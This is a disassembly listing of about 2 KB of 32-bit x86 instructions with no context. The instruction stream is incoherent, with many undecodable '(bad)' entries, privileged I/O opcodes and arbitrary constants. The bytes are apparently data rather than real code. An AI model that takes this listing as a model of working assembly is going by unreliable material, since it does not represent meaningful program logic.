  4066c2:	sub    esi,DWORD PTR ds:0xa2a77f25
  4066c8:	dec    esi
  4066c9:	sbb    DWORD PTR [edi],edi
  4066cb:	mov    eax,ds:0x1720892b
  4066d0:	dec    edx
  4066d1:	jns    0x4066d6
  4066d3:	jb     0x40673e
  4066d5:	add    dl,BYTE PTR [edx+0x2644e25]
  4066db:	push   esi
  4066dc:	ret    
  4066dd:	addr16 ret 
  4066df:	mov    esi,DWORD PTR [ebp+0x64]
  4066e2:	or     DWORD PTR [ebx],edi
  4066e4:	inc    esp
  4066e5:	push   0xffffffe7
  4066e7:	mov    ebx,es
  4066e9:	push   es
  4066ea:	(bad)  
  4066eb:	xor    ebx,DWORD PTR [ebp+0x49]
  4066ee:	leave  
  4066ef:	mov    ebp,0x9c0787a4
  4066f4:	(bad)  
  4066f5:	icebp  
  4066f6:	pusha  
  4066f7:	dec    esi
  4066f8:	dec    esp
  4066f9:	sbb    dl,BYTE PTR [eax-0x48]
  4066fc:	pop    edx
  4066fd:	dec    ecx
  4066fe:	xchg   ecx,eax
  4066ff:	ins    DWORD PTR es:[edi],dx
  406700:	cmp    al,BYTE PTR [ebp+0x6f]
  406703:	popa   
  406704:	fcmovnu st,st(4)
  406706:	data16 icebp 
  406708:	jo     0x4066ad
  40670a:	retf   0xf542
  40670d:	aam    0xc6
  40670f:	pop    ebp
  406710:	push   ds
  406711:	mov    eax,0x583eb396
  406716:	test   al,0x73
  406718:	adc    BYTE PTR [ecx],0x17
  40671b:	pop    esp
  40671c:	push   es
  40671d:	push   ss
  40671e:	push   ss
  40671f:	sub    BYTE PTR ds:0xe2f8dfd4,0xa3
  406726:	sub    DWORD PTR [ecx-0xfc2859],ebp
  40672c:	xchg   ebp,eax
  40672d:	cmp    eax,edx
  40672f:	dec    ebp
  406730:	clc    
  406731:	aam    0x1d
  406733:	or     al,0xd4
  406735:	jle    0x40678b
  406737:	cmp    eax,0x7c3ff113
  40673c:	cmp    dh,BYTE PTR [edx+0x18e8ad67]
  406742:	push   esp
  406743:	mov    ecx,0x6ceaeedf
  406748:	xor    esi,esp
  40674a:	mov    ds:0x95beaa00,eax
  40674f:	xchg   ebx,eax
  406750:	pop    edx
  406751:	cmp    eax,0x416deee7
  406756:	jb     0x406772
  406758:	push   ss
  406759:	push   ss
  40675a:	fiadd  WORD PTR [edx-0x66]
  40675d:	mov    ecx,0x20087ce
  406762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406763:	dec    eax
  406764:	imul   ebp,DWORD PTR [edx],0x8fecc33d
  40676a:	not    DWORD PTR [eax]
  40676c:	dec    ebx
  40676d:	fmul   DWORD PTR [edx+0x4d87a5d9]
  406773:	xor    BYTE PTR [esi-0x4e],dl
  406776:	repz loop 0x4067ae
  406779:	(bad)  
  40677a:	loop   0x4067b3
  40677c:	mov    eax,ds:0x4c0088c3
  406781:	cmp    eax,esp
  406783:	jb     0x406763
  406785:	and    eax,0x946087de
  40678a:	mov    ch,0xf2
  40678c:	mov    ebx,DWORD PTR [ebx-0x718cd5f8]
  406792:	or     edi,DWORD PTR [ebx-0x3939685a]
  406798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406799:	js     0x406813
  40679b:	jp     0x406764
  40679d:	jp     0x406808
  40679f:	mov    dl,0xf0
  4067a1:	(bad)  
  4067a2:	daa    
  4067a3:	xchg   edx,eax
  4067a4:	cwde   
  4067a5:	mov    ds,ecx
  4067a7:	xchg   edx,eax
  4067a8:	test   BYTE PTR [ebp-0x8f84792],cl
  4067ae:	rol    BYTE PTR [edi],0x80
  4067b1:	lea    edx,[esi+0x54]
  4067b4:	icebp  
  4067b5:	adc    BYTE PTR [ebx+0x344c8013],bl
  4067bb:	gs sti 
  4067bd:	xchg   esi,eax
  4067be:	mov    eax,ds:0x1a8755f8
  4067c3:	mov    WORD PTR [ebx+0x2f],ss
  4067c6:	and    eax,0xdd38e996
  4067cb:	mov    eax,esi
  4067cd:	mov    cl,0x6c
  4067cf:	test   DWORD PTR [ebp+esi*2-0x2cc4b579],ebx
  4067d6:	xor    al,BYTE PTR [edi+edi*2+0x1e5838c5]
  4067dd:	scas   al,BYTE PTR es:[edi]
  4067de:	mov    cl,0xc8
  4067e0:	jmp    0xc7c552d1
  4067e5:	in     al,dx
  4067e6:	sub    ch,bh
  4067e8:	arpl   ax,si
  4067ea:	lea    esp,[ecx-0x2d3cbdcd]
  4067f0:	mov    DWORD PTR ds:0x5363b456,edx
  4067f7:	cmp    al,0xee
  4067fa:	pop    edx
  4067fb:	push   esp
  4067fc:	sahf   
  4067fd:	cwde   
  4067fe:	(bad)  
  4067ff:	in     al,dx
  406800:	in     al,dx
  406801:	daa    
  406802:	test   eax,0xf7c4cd82
  406807:	and    al,0xe2
  406809:	pop    ecx
  40680a:	push   eax
  40680b:	jg     0x406861
  40680d:	mov    ?,ax
  406810:	mov    ds:0xdf7a8c33,eax
  406815:	xor    BYTE PTR [ebx+0x6f],bl
  406818:	xchg   DWORD PTR [ebx],ecx
  40681a:	push   esp
  40681b:	and    dh,dl
  40681d:	xor    DWORD PTR [edx+edx*8+0x48],esi
  406821:	mov    dh,0x2
  406823:	sub    esp,0xffffffb3
  406826:	push   ss
  406827:	push   0x8ed343dd
  40682c:	cld    
  40682d:	xor    al,0x42
  40682f:	stc    
  406830:	pop    eax
  406831:	adc    BYTE PTR [ebp+0x45c5df9b],dh
  406837:	mov    al,ds:0x9b1550b1
  40683c:	xchg   edx,eax
  40683d:	aaa    
  40683e:	sbb    al,0x8a
  406840:	cmp    eax,0xb52482fe
  406845:	cmp    al,0x12
  406847:	aam    0xd4
  406849:	je     0x40687e
  40684b:	das    
  40684c:	sahf   
  40684d:	sub    eax,DWORD PTR [ebp-0x28a328a]
  406853:	cs retf 0xb4a6
  406857:	ins    BYTE PTR es:[edi],dx
  406858:	and    DWORD PTR ds:0x8b9536f8,eax
  40685e:	aas    
  40685f:	mov    al,0x29
  406861:	jae    0x406855
  406863:	cmp    BYTE PTR [ebx],0xc7
  406866:	push   eax
  406867:	ret    0x1c81
  40686a:	mov    cl,0xa1
  40686c:	fwait
  40686d:	or     ch,BYTE PTR [esi-0x7f506e8d]
  406873:	pusha  
  406874:	aad    0x26
  406876:	das    
  406877:	inc    eax
  406878:	in     eax,0x35
  40687a:	mov    ds:0xf440e60d,eax
  40687f:	xchg   bh,ch
  406881:	add    ebx,DWORD PTR [eax+eax*4]
  406884:	xchg   edi,eax
  406885:	mov    ebp,0xdeb1ebd5
  40688a:	and    DWORD PTR [ebx],ebx
  40688c:	cmp    eax,0x5c9ff247
  406891:	retf   0x1ea2
  406894:	mov    bl,0x7f
  406896:	push   eax
  406897:	push   cs
  406898:	mov    cl,0xbc
  40689a:	push   ss
  40689b:	loopne 0x4068c2
  40689d:	(bad)  
  40689e:	int    0xfb
  4068a0:	loope  0x406848
  4068a2:	jg     0x406857
  4068a4:	scas   al,BYTE PTR es:[edi]
  4068a5:	gs mov esp,0xd69ae3
  4068ab:	xchg   esp,eax
  4068ac:	mov    ch,BYTE PTR [edx-0x5332c699]
  4068b2:	popf   
  4068b3:	in     al,0x89
  4068b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068b6:	sub    eax,0x6ea67ee0
  4068bb:	hlt    
  4068bc:	xchg   esi,eax
  4068bd:	fdecstp 
  4068bf:	data16 add BYTE PTR es:[ecx-0x5c9372e1],bl
  4068c7:	mov    eax,ds:0xe8042ddf
  4068cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068cd:	mov    ?,WORD PTR [eax-0x4e]
  4068d0:	mov    esi,DWORD PTR [esi+ebp*2+0x29]
  4068d4:	push   cs
  4068d5:	std    
  4068d6:	lods   al,BYTE PTR ds:[esi]
  4068d7:	xchg   DWORD PTR [esi+0x7],ebp
  4068da:	es sti 
  4068dc:	push   ebp
  4068dd:	pop    eax
  4068de:	sub    bl,BYTE PTR [edi+0x2b]
  4068e1:	retf   
  4068e2:	xor    BYTE PTR [ebp-0x16],0xd5
  4068e6:	mov    dh,0x4c
  4068e8:	out    0x54,eax
  4068ea:	mov    al,ds:0xeb2f8ea1
  4068ef:	cmp    edi,DWORD PTR [eax+0x2f]
  4068f2:	je     0x40693d
  4068f4:	retf   
  4068f5:	add    eax,0x2dabc209
  4068fa:	nop
  4068fb:	inc    ebx
  4068fc:	test   ah,ah
  4068fe:	or     DWORD PTR [ecx-0x725f2b54],ebx
  406904:	rcl    BYTE PTR [eax],0x52
  406907:	xchg   edi,eax
  406908:	dec    ecx
  406909:	aam    0xc6
  40690b:	jnp    0x406971
  40690d:	sti    
  40690e:	jno    0x406909
  406910:	add    BYTE PTR [ecx-0x18],ch
  406913:	addr16 loopne 0x40692c
  406916:	sub    BYTE PTR [edx+0x6e937ba8],dh
  40691c:	sahf   
  40691d:	lahf   
  40691e:	inc    esp
  40691f:	push   cs
  406920:	dec    edx
  406921:	mov    ds:0xc43e4c5d,eax
  406926:	outs   dx,DWORD PTR ds:[esi]
  406927:	push   ebx
  406928:	ds iret 
  40692a:	out    0xfe,eax
  40692c:	mov    ch,0x57
  40692f:	and    al,0x28
  406931:	mov    ebx,0x5f048e68
  406936:	in     eax,dx
  406937:	jecxz  0x406997
  406939:	js     0x4068fd
  40693b:	inc    edi
  40693c:	pop    ds
  40693d:	jne    0x40699f
  40693f:	push   esi
  406940:	int    0x2b
  406942:	je     0x406973
  406944:	cmp    ch,BYTE PTR [eax-0x88e8e0d]
  40694a:	push   ebx
  40694b:	je     0x406972
  40694d:	push   eax
  40694e:	dec    edi
  40694f:	fisub  DWORD PTR [eax+0x2b]
  406952:	mov    dh,0x89
  406954:	dec    edi
  406955:	mov    cl,0xe2
  406957:	cmp    bl,cl
  406959:	push   ebx
  40695a:	pop    esp
  40695b:	adc    al,0xcc
  40695d:	scas   al,BYTE PTR es:[edi]
  40695e:	(bad)  
  40695f:	jmp    0x406982
  406961:	daa    
  406962:	(bad)  
  406963:	dec    esi
  406964:	sub    al,0xd5
  406966:	sar    dl,1
  406968:	popf   
  406969:	jg     0x4069d3
  40696b:	pusha  
  40696c:	mov    ah,0x5a
  40696e:	cmp    cl,BYTE PTR [eax+0x7]
  406971:	hlt    
  406972:	repz mov ds:0x205f4834,eax
  406978:	(bad)  
  406979:	fsubr  QWORD PTR [edi-0x73]
  40697c:	pop    edx
  40697d:	push   ebx
  40697e:	(bad)  
  40697f:	(bad)  
  406980:	test   eax,0x1e42daa0
  406985:	and    DWORD PTR [ecx],edx
  406987:	xchg   cl,ch
  406989:	out    dx,eax
  40698a:	test   eax,0xfc20d7f3
  40698f:	daa    
  406990:	cli    
  406991:	adc    ax,0xdccd
  406995:	push   ds
  406996:	pushf  
  406997:	mov    ds:0x921fdb05,al
  40699c:	loopne 0x4069d3
  40699e:	xor    ecx,DWORD PTR [edx]
  4069a0:	mov    al,0xf7
  4069a2:	int    0xdc
  4069a4:	mov    DWORD PTR [eax+0x5d149313],esi
  4069aa:	das    
  4069ab:	adc    esi,DWORD PTR [esi+edx*2]
  4069ae:	arpl   WORD PTR [eax],bx
  4069b0:	xor    ecx,edx
  4069b2:	shl    DWORD PTR [esi],cl
  4069b4:	test   DWORD PTR [ebx],0x23153ff1
  4069ba:	push   esp
  4069bb:	pop    esi
  4069bc:	push   ebx
  4069bd:	sub    DWORD PTR [edx-0x4a],esi
  4069c0:	add    BYTE PTR [ebx+0x25],0x7d
  4069c4:	sub    al,0x1b
  4069c6:	cmp    edi,DWORD PTR [eax+ecx*2-0x8]
  4069ca:	les    esp,FWORD PTR [esi-0x12]
  4069cd:	mov    BYTE PTR [edi-0x7462dd7f],ah
  4069d3:	adc    dh,ah
  4069d5:	push   ebx
  4069d6:	sar    bh,cl
  4069d8:	cdq    
  4069d9:	dec    edi
  4069da:	push   0x4
  4069dc:	repz dec esp
  4069de:	enter  0x6633,0xea
  4069e2:	mov    esp,DWORD PTR [edx-0x6eb8404e]
  4069e8:	std    
  4069e9:	sbb    bl,BYTE PTR [edi+edi*1-0x28]
  4069ed:	js     0x4069a7
  4069ef:	(bad)  
  4069f0:	rol    ebx,1
  4069f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069f3:	fdivr  st,st(7)
  4069f5:	cmp    DWORD PTR [ebx],0xffffffab
  4069f8:	inc    esi
  4069f9:	(bad)  
  4069fa:	loope  0x4069e4
  4069fc:	sar    cl,1
  4069fe:	daa    
  4069ff:	xor    al,0x54
  406a01:	add    dh,ah
  406a03:	out    dx,al
  406a04:	or     DWORD PTR [esi+0x852d85e],ebx
  406a0a:	sub    BYTE PTR [esi+ebx*4+0x4cf32231],ah
  406a11:	and    DWORD PTR [ebx+0x78],0x73
  406a15:	xlat   BYTE PTR ds:[ebx]
  406a16:	cld    
  406a17:	ja     0x4069ff
  406a19:	int    0xcf
  406a1b:	inc    eax
  406a1c:	sti    
  406a1d:	in     eax,0x87
  406a1f:	leave  
  406a20:	mov    edx,esi
  406a22:	lods   eax,DWORD PTR ds:[esi]
  406a23:	(bad)  
  406a24:	pop    ds
  406a25:	mov    al,ds:0x39e3d788
  406a2a:	push   ds
  406a2b:	push   ecx
  406a2c:	cmp    edx,DWORD PTR [ebx-0x1c42cae0]
  406a32:	pop    edx
  406a33:	cmp    BYTE PTR [edi+edx*8-0x3367356a],ah
  406a3a:	mov    esi,0xd0f1b85
  406a3f:	jne    0x406a69
  406a41:	mov    eax,ds:0x93b3395d
  406a46:	jns    0x406a41
  406a48:	outs   dx,DWORD PTR ds:[esi]
  406a49:	ret    0x221f
  406a4c:	stos   BYTE PTR es:[edi],al
  406a4d:	xchg   esp,eax
  406a4e:	adc    al,0xe1
  406a50:	pop    esi
  406a51:	push   ebx
  406a52:	mov    cl,0xed
  406a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a55:	pop    ds
  406a56:	add    al,0x7f
  406a58:	xor    ah,BYTE PTR gs:[ecx+0x24]
  406a5c:	xchg   esi,eax
  406a5d:	pop    ebx
  406a5e:	xchg   ecx,eax
  406a5f:	in     eax,0x6
  406a61:	mov    dl,0x41
  406a63:	test   esp,eax
  406a65:	inc    esp
  406a66:	fs test al,0xa1
  406a69:	push   ds
  406a6a:	imul   ebp,DWORD PTR [edx],0xfffffff3
  406a6d:	push   edi
  406a6e:	and    BYTE PTR [eax-0x5dcc033d],bh
  406a74:	xchg   ebx,eax
  406a75:	int    0x6c
  406a77:	mov    bl,0xcd
  406a79:	fs cwde 
  406a7b:	cdq    
  406a7c:	sub    eax,0x56a79b77
  406a81:	mov    edx,0xd0c3ae58
  406a86:	mov    cl,0x34
  406a88:	push   eax
  406a89:	nop
  406a8a:	xor    ecx,eax
  406a8c:	jb     0x406abf
  406a8e:	ficomp WORD PTR [esi+0x7d8bd391]
  406a94:	lahf   
  406a95:	xchg   ebp,eax
  406a96:	(bad)  
  406a97:	mov    ds:0x4731472e,al
  406a9c:	mov    al,0xb2
  406a9e:	daa    
  406a9f:	xchg   ebp,eax
  406aa0:	test   esp,esi
  406aa2:	pop    ss
  406aa3:	aaa    
  406aa4:	repz pop es
  406aa6:	or     DWORD PTR [edi-0x62df46d8],edx
  406aac:	js     0x406aa9
  406aae:	fstp   DWORD PTR [ecx+eax*8+0x43376643]
  406ab5:	inc    esp
  406ab6:	lods   al,BYTE PTR ds:[esi]
  406ab7:	das    
  406ab8:	xchg   ebx,eax
  406ab9:	pusha  
  406aba:	mov    eax,ds:0xa4aca555
  406abf:	or     eax,0x7992a7d6
  406ac4:	push   0x66
  406ac6:	sub    edi,DWORD PTR [edi+edi*4]
  406ac9:	add    al,0xd4
  406acb:	out    dx,eax
  406acc:	cmp    ecx,DWORD PTR [eax-0x71]
  406acf:	pop    esp
  406ad0:	xchg   ebx,eax
  406ad1:	fsub   DWORD PTR [eax-0x25e1bec8]
  406ad7:	ror    BYTE PTR [eax+0x5e],cl
  406ada:	inc    ecx
  406adb:	mov    fs,WORD PTR [eax]
  406add:	aam    0xef
  406adf:	lds    esp,FWORD PTR [edi]
  406ae1:	div    BYTE PTR [ebp+edx*8+0x656829b4]
  406ae8:	pop    ds
  406ae9:	jg     0x406a9d
  406aeb:	outs   dx,DWORD PTR ds:[esi]
  406aec:	push   eax
  406aed:	dec    eax
  406aee:	imul   eax,DWORD PTR [esi+0xf],0xa832a542
  406af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406af6:	or     esp,DWORD PTR [esi+0x54]
  406af9:	and    eax,0x5b50108
  406afe:	daa    
  406aff:	(bad)  
  406b00:	(bad)  
  406b01:	aam    0x29
  406b03:	mov    cl,0xd9
  406b05:	dec    ebp
  406b06:	mov    ds:0x32391b2b,eax
  406b0b:	(bad)  
  406b0c:	es pop eax
  406b0e:	lds    ecx,FWORD PTR [edi-0x599d1c5]
  406b14:	enter  0x3608,0x28
  406b18:	repz arpl WORD PTR [edx],bx
  406b1b:	add    al,0x5e
  406b1d:	xor    al,0xa4
  406b1f:	cs jbe 0x406b06
  406b22:	jmp    0xb037:0x7690483e
  406b29:	or     al,0x3f
  406b2b:	es addr16 das 
  406b2e:	inc    esi
  406b2f:	shr    eax,cl
  406b31:	and    DWORD PTR ds:0xd041eb9e,0x6222e6eb
  406b3b:	cmp    DWORD PTR [ebp-0x1e],0xffffffd1
  406b3f:	or     al,0x6f
  406b41:	rcr    BYTE PTR [edx+ecx*2],1
  406b44:	xchg   esi,eax
  406b45:	and    bh,BYTE PTR ds:[edi+edi*4+0x79]
  406b4a:	jecxz  0x406af5
  406b4c:	fs cdq 
  406b4e:	icebp  
  406b4f:	inc    ecx
  406b50:	ret    0xd896
  406b53:	pop    esi
  406b54:	and    eax,DWORD PTR [esi+0x71]
  406b57:	jg     0x406b46
  406b59:	jb     0x406bca
  406b5b:	adc    BYTE PTR [edx],cl
  406b5d:	xchg   ebp,eax
  406b5e:	clc    
  406b5f:	jb     0x406b4d
  406b61:	adc    al,0xb9
  406b63:	xchg   ebp,eax
  406b64:	aaa    
  406b65:	mov    bl,0x69
  406b67:	int3   
  406b68:	fcmovnbe st,st(2)
  406b6a:	ins    DWORD PTR es:[edi],dx
  406b6b:	pop    ds
  406b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b6d:	fcomp  QWORD PTR [eax+0x24]
  406b70:	mov    ecx,0xd47a4b4b
  406b75:	shl    BYTE PTR [edx],1
  406b77:	int3   
  406b78:	jne    0x406b5c
  406b7a:	push   ebp
  406b7b:	pop    eax
  406b7c:	dec    eax
  406b7d:	popa   
  406b7e:	sbb    bl,BYTE PTR [esp+ebp*8+0x2ca3bdaf]
  406b85:	sar    bh,cl
  406b87:	xor    BYTE PTR [ecx],0x48
  406b8a:	(bad)  
  406b8b:	xchg   esp,eax
  406b8c:	ss jle 0x406bb3
  406b8f:	inc    edi
  406b90:	inc    eax
  406b91:	push   ss
  406b92:	sbb    bl,dh
  406b94:	dec    eax
  406b95:	popa   
  406b96:	js     0x406bd9
  406b98:	mov    ds:0xe4abf1e7,eax
  406b9d:	pop    ebp
  406b9e:	loope  0x406bc5
  406ba0:	sub    eax,0xa7917d79
  406ba5:	xchg   ebx,eax
  406ba6:	in     al,dx
  406ba7:	cmc    
  406ba8:	repz sar bl,0x87
  406bac:	aad    0xf1
  406bae:	adc    eax,0x20460cc4
  406bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bb4:	in     al,0x62
  406bb6:	xchg   ecx,eax
  406bb7:	mov    ebp,0x7cdea9ce
  406bbc:	mov    gs,WORD PTR [eax+ecx*8-0x72]
  406bc0:	loop   0x406b54
  406bc2:	dec    esi
  406bc3:	mov    ah,0x66
  406bc5:	rcr    ebx,0x6
  406bc8:	inc    eax
  406bc9:	add    al,BYTE PTR [esi]
  406bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bcc:	in     al,0x21
  406bce:	loopne 0x406b9f
  406bd0:	lea    eax,ss:0x8a709345
  406bd7:	push   0xffffffe4
  406bd9:	ss push ebp
  406bdb:	call   0x2c09aa41
  406be0:	add    BYTE PTR [ebx],cl
  406be2:	test   dh,bh
  406be4:	pop    ds
  406be5:	sub    al,0x45
  406be7:	adc    al,bh
  406be9:	popa   
  406bea:	mov    ds:0x186bc52f,eax
  406bef:	cmp    al,BYTE PTR [esi+ebx*1-0x41383250]
  406bf6:	xor    al,ah
  406bf8:	mov    gs,WORD PTR [esi-0x170bff86]
  406bfe:	ins    BYTE PTR es:[edi],dx
  406bff:	jge    0x406bf8
  406c01:	inc    esi
  406c02:	dec    DWORD PTR cs:[ebx+edx*2-0x49df3d5d]
  406c0a:	lahf   
  406c0b:	out    0x24,eax
  406c0d:	ja     0x406c10
  406c0f:	push   esp
  406c10:	es dec ebx
  406c12:	shl    BYTE PTR [ecx+0x54],0x2e
  406c16:	imul   esi,DWORD PTR [ebp+0x7f145dd8],0xffffffb1
  406c1d:	jbe    0x406c72
  406c1f:	in     al,dx
  406c20:	mov    ebx,0xf70141d5
  406c25:	adc    eax,DWORD PTR [ebx]
  406c27:	popf   
  406c28:	xlat   BYTE PTR ds:[ebx]
  406c29:	sub    DWORD PTR [edx-0x4ddff167],ebp
  406c2f:	les    edx,FWORD PTR [edx+edx*8]
  406c32:	pop    ebp
  406c33:	fsqrt  
  406c35:	mul    DWORD PTR [esi+0x36]
  406c38:	enter  0x1ba9,0x59
  406c3c:	xchg   DWORD PTR [esi-0xb],edi
  406c3f:	xchg   DWORD PTR [ecx-0x5372a47f],esi
  406c45:	ja     0x406c1a
  406c47:	leave  
  406c48:	xor    eax,0xd942f4cb
  406c4d:	mov    al,0xb2
  406c4f:	mov    ebp,0x370656ac
  406c54:	pusha  
  406c55:	test   eax,0x3833db2c
  406c5a:	xor    al,0x8f
  406c5c:	gs stos BYTE PTR es:[edi],al
  406c5e:	xlat   BYTE PTR ds:[ebx]
  406c5f:	pop    ebx
  406c60:	ss ds pop ebp
  406c63:	jp     0x406c1d
  406c65:	stc    
  406c66:	sub    esi,DWORD PTR [edi+0x244866ac]
  406c6c:	mov    dl,0x9f
  406c6e:	push   es
  406c6f:	out    dx,al
  406c70:	lea    eax,[ecx]
  406c72:	je     0x406cae
  406c74:	mov    es,WORD PTR [edx+esi*1-0x19b30d67]
  406c7b:	ins    BYTE PTR es:[edi],dx
  406c7c:	mov    dh,0x48
  406c7e:	sti    
  406c7f:	jmp    0x406cc5
  406c81:	adc    eax,0x51e343d1
  406c86:	adc    BYTE PTR [ebp+0x6b1d883],ah
  406c8c:	or     ecx,eax
  406c8e:	push   esp
  406c8f:	push   eax
  406c90:	add    eax,eax
  406c92:	push   eax
  406c93:	imul   eax,DWORD PTR [eax],0x719ab324
  406c99:	push   0xffffffe4
  406c9b:	std    
  406c9c:	add    esi,edi
  406c9e:	pop    ecx
  406c9f:	in     eax,dx
  406ca0:	and    al,0x80
  406ca2:	stos   DWORD PTR es:[edi],eax
  406ca3:	int3   
  406ca4:	xchg   edi,eax
  406ca5:	sbb    bh,BYTE PTR [ebp+ecx*4-0x48]
  406ca9:	rol    DWORD PTR [esi],cl
  406cab:	fstp   DWORD PTR [ebx-0x489c8a46]
  406cb1:	mov    eax,ds:0x5a42ee31
  406cb6:	cdq    
  406cb7:	sbb    ecx,DWORD PTR [esi]
  406cb9:	sti    
  406cba:	inc    esi
  406cbb:	pop    es
  406cbc:	mov    al,ds:0x9ee9125b
  406cc1:	jb     0x406c49
  406cc3:	or     al,BYTE PTR [edx+0x738b9a76]
  406cc9:	pop    ebp
  406cca:	xchg   ebp,eax
  406ccb:	sub    edx,DWORD PTR [edi-0x68]
  406cce:	bnd jno 0x406cbb
  406cd1:	add    edx,DWORD PTR [ebx]
  406cd3:	icebp  
  406cd4:	aad    0xa0
  406cd6:	mov    esp,0x3e595c55
  406cdb:	push   esi
  406cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cdd:	es das 
  406cdf:	jge    0x406d18
  406ce1:	fst    QWORD PTR ds:0x7b6c5bd4
  406ce7:	mov    bh,0x36
  406ce9:	adc    BYTE PTR [ecx+0x66240a52],bl
  406cef:	mov    BYTE PTR [esi],bl
  406cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf2:	in     al,0x65
  406cf4:	dec    ecx
  406cf5:	inc    esp
  406cf6:	xchg   BYTE PTR [ecx],cl
  406cf8:	cmp    al,0x40
  406cfa:	(bad)  
  406cfb:	outs   dx,BYTE PTR ds:[esi]
  406cfc:	pop    ecx
  406cfd:	mov    ds:0x8f005325,eax
  406d02:	pop    ebp
  406d03:	cmp    ch,BYTE PTR [esp+edx*4+0x313d7818]
  406d0a:	xchg   ebx,eax
  406d0b:	inc    edx
  406d0c:	or     esi,edx
  406d0e:	inc    esi
  406d0f:	pop    es
  406d10:	dec    esi
  406d11:	enter  0x84fe,0x3f
  406d15:	jl     0x406d1b
  406d17:	xor    al,0xf8
  406d19:	push   0x39
  406d1b:	retf   0xfcdf
  406d1e:	push   ecx
  406d1f:	and    esp,DWORD PTR [ebp+0x25]
  406d22:	dec    esp
  406d24:	jp     0x406d13
  406d26:	vmptrld QWORD PTR [edx+0x48]
  406d2a:	out    0x29,al
  406d2c:	pop    ss
  406d2d:	pusha  
  406d2e:	push   ds
  406d2f:	adc    DWORD PTR [ecx-0x37],edi
  406d32:	cdq    
  406d33:	cwde   
  406d34:	push   ss
  406d35:	add    ebx,esp
  406d37:	imul   DWORD PTR [edi+0x755e726b]
  406d3d:	pop    esp
  406d3e:	out    dx,eax
  406d3f:	pusha  
  406d40:	sar    DWORD PTR [eax],cl
  406d42:	loopne 0x406ccb
  406d44:	xor    al,0x44
  406d46:	stc    
  406d47:	sar    DWORD PTR [edi],0xea
  406d4a:	and    edi,eax
  406d4c:	lods   eax,DWORD PTR ds:[esi]
  406d4d:	mov    ah,BYTE PTR ds:0x7ffec7ed
  406d53:	cmp    eax,0x3f07bfde
  406d58:	pop    ebp
  406d59:	sbb    ah,al
  406d5b:	sub    BYTE PTR [edi+0x19c8eeb6],al
  406d61:	aas    
  406d62:	pop    eax
  406d63:	add    al,0x22
  406d65:	and    al,0x79
  406d67:	retf   0xd303
  406d6a:	jmp    0x6eaf1414
  406d6f:	sbb    edx,DWORD PTR [eax]
  406d71:	push   0xb93f412
  406d76:	int3   
  406d77:	shr    DWORD PTR [edi],0x14
  406d7a:	xor    eax,DWORD PTR [eax-0x44f9a5ae]
  406d80:	adc    eax,0x423a174d
  406d85:	xor    esi,DWORD PTR [eax-0x74]
  406d88:	shr    DWORD PTR [ebx+0x49e10ef4],cl
  406d8e:	fimul  DWORD PTR [ebx+0x65056746]
  406d94:	and    BYTE PTR ds:0x9ede2c1d,ch
  406d9a:	loopne 0x406dfd
  406d9c:	in     al,0xa4
  406d9e:	or     DWORD PTR [edi],esi
  406da0:	leave  
  406da1:	ins    BYTE PTR es:[edi],dx
  406da2:	repnz add al,0x7c
  406da5:	inc    ecx
  406da6:	cmp    BYTE PTR [edi+0x55],al
  406da9:	push   esp
  406daa:	sub    DWORD PTR [ebp+0x3c],0xffffff9d
  406dae:	pop    esi
  406daf:	mov    bl,0x7c
  406db1:	lds    edx,FWORD PTR [ebx+0x5b]
  406db4:	mov    bh,0xbf
  406db6:	popa   
  406db7:	add    BYTE PTR fs:[ecx+eax*1],bl
  406dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dbc:	(bad)  
  406dbd:	jle    0x406d5c
  406dbf:	js     0x406e17
  406dc1:	xchg   DWORD PTR [eax+0x7a],esi
  406dc4:	mov    bl,0x4e
  406dc6:	dec    eax
  406dc7:	test   DWORD PTR [ebx+edx*8],ebx
  406dca:	aas    
  406dcb:	dec    esp
  406dcc:	cmp    DWORD PTR [ecx],esi
  406dce:	xchg   ecx,eax
  406dcf:	bound  edx,QWORD PTR [ebp-0x39]
  406dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dd3:	xchg   edi,eax
  406dd4:	popf   
  406dd5:	and    BYTE PTR [ecx],0xd4
  406dd8:	sub    DWORD PTR [edi],0x273d237a
  406dde:	add    eax,0x9dbba108
  406de3:	dec    edi
  406de4:	(bad)  
  406de5:	test   eax,0x62764b6d
  406dea:	or     al,0x1e
  406dec:	sbb    DWORD PTR [ebx+0x3b],0x78
  406df0:	stos   DWORD PTR es:[edi],eax
  406df1:	addr16 clc 
  406df3:	je     0x406d75
  406df5:	sub    DWORD PTR [ecx+eiz*1],0xa
  406df9:	das    
  406dfa:	int3   
  406dfb:	outs   dx,BYTE PTR ds:[esi]
  406dfc:	scas   eax,DWORD PTR es:[edi]
  406dfd:	fcomi  st,st(4)
  406dff:	sbb    BYTE PTR [eax+0x39],ah
  406e02:	scas   al,BYTE PTR es:[edi]
  406e03:	lea    esp,[eax+ecx*1]
  406e06:	cmp    al,0x33
  406e08:	daa    
  406e09:	sar    ch,cl
  406e0b:	or     DWORD PTR [ebp-0x3013435f],eax
  406e11:	dec    ebx
  406e12:	xchg   edi,eax
  406e13:	adc    al,0x21
  406e15:	sub    bl,cl
  406e17:	jl     0x406e70
  406e19:	add    BYTE PTR [edi+edx*8+0x8],ah
  406e1d:	pushf  
  406e1e:	jmp    0x2f2a522d
  406e23:	hlt    
  406e24:	(bad)  
  406e25:	push   edi
  406e26:	shr    DWORD PTR [esi-0x6b70048b],0xbd
  406e2d:	jl     0x406e5d
  406e2f:	fcmovb st,st(5)
  406e31:	jbe    0x406e5d
  406e33:	scas   eax,DWORD PTR es:[edi]
  406e34:	dec    edi
  406e35:	(bad)  
  406e36:	or     edx,DWORD PTR ds:0x32c78b3
  406e3c:	pushf  
  406e3d:	mov    ebx,0x79d8bba6
